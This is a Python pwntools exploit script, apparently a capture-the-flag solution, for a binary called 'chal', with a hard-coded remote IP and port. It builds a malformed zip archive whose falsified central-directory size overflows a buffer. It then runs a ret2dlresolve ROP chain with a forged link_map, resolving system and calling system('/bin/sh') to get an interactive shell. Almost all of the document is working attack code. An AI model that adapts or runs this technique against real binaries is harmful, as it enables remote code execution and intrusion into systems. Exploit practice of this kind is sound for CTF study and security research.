from pwn import *

PH = b'A'

context.terminal = ['tmux', 'splitw', '-h']

elf = context.binary = ELF('./chal')
libc = ELF('libc.so.6')

local = True

if local:
    io = elf.process()
else:
    host = '34.139.216.197'
    port = 7293
    io = remote(host, port)

if args.GDB:
    gdb.attach(io, """
        b *parse_data+522
        c
        n 14
    """)

###############################################################################
# ret2dlresolve
###############################################################################
rop = ROP([elf])

# bypass push link_map by adding 0x6 offset
resolver = elf.get_section_by_name(".plt")["sh_addr"] + 0x6
forge_area = elf.get_section_by_name(".bss")["sh_addr"] + 0x100
SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

log.info('-' * 50)
log.info(f'_dl_resolve address: {hex(resolver)}')
log.info(f'.dynsym address: {hex(SYMTAB)}')
log.info(f'.dynstr address: {hex(STRTAB)}')
log.info(f'.rel.plt address: {hex(JMPREL)}')
log.info(f'writable buffer address: {hex(forge_area)}')

###############################################################################
# Forge link_map and other tables
###############################################################################
BITMAP_64 = (1 << 64) - 1

# offset between system and target_func
target_func = 'atoi'
l_addr = libc.sym['system'] - libc.sym[target_func]
log.info('-' * 50)
log.info('Making fake link_map')
log.info(f'system@libc - {target_func}@libc: {hex(l_addr)}')

forge_data = flat({
    # link_map
    0x0: l_addr & BITMAP_64,  # l_addr
    0x68: forge_area,  # l_info[5], ptr to DT_STRTAB in _DYNAMIC
    # we won't use it so any writable area
    0x70: forge_area + 0x38,  # l_info[6], ptr to DT_SYMTAB in _DYNAMIC
    0xf8: forge_area + 0x8,  # l_info[23], ptr to DT_JMPREL in _DYNAMIC

    # _DYNAMIC
    # for DT_JMPREL
    0x8: flat([
        0,  # d_tag
        forge_area + 0x18  # d_val, ptr to DT_JMPREL
    ]),
    # for DT_SYMTAB
    0x38: flat([
        0,  # d_tag
        elf.got[target_func] - 0x8  # d_val, ptr to DT_SYMTAB
        # s.t. st_value pts to the target function in GOT
    ]),

    # DT_JMPREL
    0x18: flat([
        # normally this points to the real GOT, now we need an area to read/write.
        forge_area - l_addr,  # rela->r_offset
        7,  # rela->r_info, 7>>32=0, points to index 0 of .symtab
        0  # # rela->r_addend
    ]),

    # DT_STRTAB
    0x48: b'/bin/sh\00',
})

log.info(f'Finish make the link_map, etc, size: {hex(len(forge_data))}')

rop.read(0, forge_area, len(forge_data))  # read the link_map
rop.raw(rop.ret)  # align stack to 0x10 to call system successfully
rop.call(resolver, [forge_area + 0x48])  # call system("/bin/sh")
rop.raw(forge_area)  # link_map
rop.raw(0)  # rel_offset

###############################################################################
# Make zip file
###############################################################################

# Make compressed data
comp_data = PH * 0xa8
comp_data += rop.chain()

# 1. Make local file header
comp_size = len(comp_data)
len_file_name = 8  # for easier alignment
len_extra_field = 0
len_comment = 0

LFH = p32(0x04034b50)
LFH += PH * 14
LFH += p32(comp_size)  # Compressed size
LFH += PH * 4
LFH += p16(len_file_name)  # length file name
LFH += p16(len_extra_field)  # length of extra field
LFH += PH * len_file_name  # file name
LFH += PH * len_extra_field  # extra field

# 2. Make Central directory file header
CDFH = p32(0x02014b50)
CDFH += PH * 16
CDFH += p32(0x40)  # Compressed size, HACKED
CDFH += PH * 4
CDFH += p16(len_file_name)  # File name length
CDFH += p16(len_extra_field)  # Extra field length
CDFH += p16(len_comment)  # File comment length
CDFH += PH * 8
CDFH += p32(0)  # Relative offset of local file header.
CDFH += PH * len_file_name  # file name
CDFH += PH * len_extra_field  # extra field
CDFH += PH * len_comment  # comment

# 3. Make End of central directory record (EOCD)
cd_size = len(CDFH)
# Offset of start of central directory, relative to start of archive
cd_offset = len(LFH) + len(comp_data)

EOCD = p32(0x06054b50)  # End of central directory record
EOCD += PH * 6
# Total number of central directory records
EOCD += p16(1)
# Size of central directory (bytes)
EOCD += p32(cd_size)
# Offset of start of central directory, relative to start of archive
EOCD += p32(cd_offset)
EOCD += PH * 2

zip_file = LFH + comp_data + CDFH + EOCD
size_t = len(zip_file)

log.info(f'Finished making zip file, size: {size_t} bytes')

###############################################################################
# Execution
###############################################################################

log.info('-' * 50)

# Send size t
payload = str(size_t + 1).rjust(8, '0').encode()
io.send(payload)

# Send zip file with ROP
io.send(zip_file)

# Send fake link map
io.send(forge_data)

io.interactive()
